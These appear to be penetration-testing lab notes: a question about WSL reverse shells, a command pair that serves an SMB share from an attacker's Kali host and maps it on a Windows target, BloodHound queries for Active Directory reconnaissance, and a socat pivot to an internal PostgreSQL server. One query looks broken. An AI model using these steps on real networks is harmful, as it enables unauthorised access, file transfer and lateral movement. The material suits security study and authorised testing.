4. If we get a reverse shell, and it is running WSL, it would seem that we have ented a Linux System, however, in reality it would be a Windows System. Do commands like `uname -all` or `whoami` give you better clarification on wether or not it is a Winows System in reality?

# Command Dump Windows

```bash
impacket-smbserver share_name ./path/to/share -smb2support -user 'usr' -password 'pswd'
net use m: \\$KALI_IP\share_name # m: is just a random drive letter.
```

# Bloodhound Custom Queries
1. Get a list of all computers on the domain > `MATCH (m:Computer) RETURN m`
2. Get all users in the domain > `MATCH (m:User) RETURN m34`
3. Get all active sessions > `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`

# Port Forwarding Process
1. Creating a forward on the Dual Homed Machine with SOCAT:
```bash
# start a socat process on the dual_homed machine
# SOCAT WORKING
# socat "LISTEN" and then "FORWARD"
# socat TCP-LISTEN:$PORT,fork -- opens a port on the DH machine.
# fork -- creates a new process.
# TCP:$INTERNAL_TARGET_TP:$PORT -- this port should already be open.
# Ports 0-1024 require privs, do not use.
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

2. Interacting with a port on one of the internal machines (PostgreSQL):
```bash
# now just interact with the internal IP just like normal.
psql -h $DH_IP -p $INTERNAL_PORT -U $USR
# $DH_IP -- send all traffic to the dual homed machine.
# DH Machine will forward it to the internal machine (via socat),
```
